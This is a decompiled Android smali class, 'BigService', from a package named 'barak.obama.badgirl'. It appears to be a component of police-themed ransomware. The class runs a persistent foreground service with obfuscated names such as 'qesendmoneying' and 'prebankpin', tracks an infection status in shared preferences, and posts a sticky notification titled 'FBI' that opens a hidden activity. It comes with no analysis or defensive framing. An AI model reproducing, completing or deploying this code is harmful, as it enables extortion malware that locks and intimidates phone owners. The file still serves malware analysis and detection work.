.class public Lbarak/obama/badgirl/BigService;
.super Landroid/app/Service;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# static fields
.field public static preswiftas:Lbarak/obama/badgirl/a;

.field public static serveres:Lbarak/obama/badgirl/BigService;


# instance fields
.field protected prepincodesu:Z

.field protected qelivebanku:Z

.field protected vanilaes:I


# direct methods
.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    iput-boolean v0, p0, Lbarak/obama/badgirl/BigService;->qelivebanku:Z

    iput-boolean v0, p0, Lbarak/obama/badgirl/BigService;->prepincodesu:Z

    iput v0, p0, Lbarak/obama/badgirl/BigService;->vanilaes:I

    return-void
.end method

.method private neamazones()Landroid/app/PendingIntent;
    .locals 3

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lbarak/obama/badgirl/HideActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v1, 0x0

    const/high16 v2, 0x8000000

    invoke-static {p0, v1, v0, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    return-object v0
.end method

.method public static qesendmoneying()V
    .locals 1

    sget-object v0, Lbarak/obama/badgirl/BigService;->serveres:Lbarak/obama/badgirl/BigService;

    if-eqz v0, :cond_0

    sget-object v0, Lbarak/obama/badgirl/BigService;->serveres:Lbarak/obama/badgirl/BigService;

    invoke-virtual {v0}, Lbarak/obama/badgirl/BigService;->stopSelf()V

    :cond_0
    return-void
.end method


# virtual methods
.method public necodermes(ILandroid/app/Notification;Z)V
    .locals 1

    iget-boolean v0, p0, Lbarak/obama/badgirl/BigService;->qelivebanku:Z

    if-nez v0, :cond_1

    if-eqz p2, :cond_1

    const/4 v0, 0x1

    iput-boolean v0, p0, Lbarak/obama/badgirl/BigService;->qelivebanku:Z

    iput p1, p0, Lbarak/obama/badgirl/BigService;->vanilaes:I

    iput-boolean p3, p0, Lbarak/obama/badgirl/BigService;->prepincodesu:Z

    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    iget v0, p0, Lbarak/obama/badgirl/BigService;->vanilaes:I

    if-eq v0, p1, :cond_0

    if-lez p1, :cond_0

    if-eqz p2, :cond_0

    iput p1, p0, Lbarak/obama/badgirl/BigService;->vanilaes:I

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lbarak/obama/badgirl/BigService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, p1, p2}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    const/4 v5, 0x0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "systema"

    invoke-virtual {p0, v0, v5}, Lbarak/obama/badgirl/BigService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    new-instance v1, Lbarak/obama/badgirl/bm;

    invoke-direct {v1, v0}, Lbarak/obama/badgirl/bm;-><init>(Landroid/content/SharedPreferences;)V

    invoke-virtual {v1}, Lbarak/obama/badgirl/bm;->banku()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    new-instance v1, Lbarak/obama/badgirl/ca;

    invoke-direct {v1}, Lbarak/obama/badgirl/ca;-><init>()V

    const-string v2, "putString"

    const-string v3, "start"

    const-string v4, "start"

    invoke-virtual {v1, v0, v2, v3, v4}, Lbarak/obama/badgirl/ca;->a(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v0, "systema"

    invoke-virtual {p0, v0, v5}, Lbarak/obama/badgirl/BigService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    new-instance v1, Lbarak/obama/badgirl/cb;

    invoke-direct {v1}, Lbarak/obama/badgirl/cb;-><init>()V

    const-string v2, "getString"

    const-string v3, "status"

    const-string v4, "s0"

    invoke-virtual {v1, v0, v2, v3, v4}, Lbarak/obama/badgirl/cb;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "s9"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    sput-object p0, Lbarak/obama/badgirl/BigService;->serveres:Lbarak/obama/badgirl/BigService;

    new-instance v0, Lbarak/obama/badgirl/a;

    invoke-direct {v0, p0}, Lbarak/obama/badgirl/a;-><init>(Lbarak/obama/badgirl/BigService;)V

    sput-object v0, Lbarak/obama/badgirl/BigService;->preswiftas:Lbarak/obama/badgirl/a;

    :cond_0
    return-void
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    sget-object v0, Lbarak/obama/badgirl/BigService;->preswiftas:Lbarak/obama/badgirl/a;

    if-eqz v0, :cond_0

    sget-object v0, Lbarak/obama/badgirl/BigService;->preswiftas:Lbarak/obama/badgirl/a;

    invoke-virtual {v0}, Lbarak/obama/badgirl/a;->doluckamaning()V

    :cond_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method protected prebankpin(I)Landroid/app/Notification;
    .locals 5

    new-instance v0, Landroid/app/Notification;

    const v1, 0x7f020020

    const-string v2, "FBI"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x2

    or-int/lit8 v1, v1, 0x8

    iput v1, v0, Landroid/app/Notification;->flags:I

    const-string v1, "FBI "

    const-string v2, "FBI"

    invoke-direct {p0}, Lbarak/obama/badgirl/BigService;->neamazones()Landroid/app/PendingIntent;

    move-result-object v3

    invoke-virtual {v0, p0, v1, v2, v3}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    return-object v0
.end method

.method public qebanking(IZ)V
    .locals 1

    invoke-virtual {p0, p1}, Lbarak/obama/badgirl/BigService;->prebankpin(I)Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, p1, v0, p2}, Lbarak/obama/badgirl/BigService;->necodermes(ILandroid/app/Notification;Z)V

    return-void
.end method

.method public qeswiftes(IZ)V
    .locals 1

    const/4 v0, 0x0

    iput-boolean v0, p0, Lbarak/obama/badgirl/BigService;->qelivebanku:Z

    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    return-void
.end method
